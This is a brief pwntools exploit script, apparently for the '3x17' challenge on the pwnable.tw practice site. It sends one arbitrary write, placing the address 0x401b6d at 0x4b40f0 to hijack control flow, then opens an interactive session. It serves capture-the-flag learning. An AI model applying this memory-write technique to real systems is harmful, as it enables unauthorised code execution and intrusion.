#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("3x17")
libc = elf.libc

local = True 
if local:
    p = process("./3x17")
    gdb.attach(p,'''b*0x40f940\nc\nb*0x40f6c0\nc\nb*0x40f81e\nc''')
else:
    p = remote('chall.pwnable.tw', 10001)

elf = context.binary = ELF('./3x17', checksec=False)

vuln = 0x401b6d
payload = str(0x4b40f0)
p.sendlineafter(b"addr:", payload)
print("[+]Addr: Done")
payload = p64(vuln)
p.sendlineafter(b"data:", payload)
print("[+]Data: Done")
p.interactive()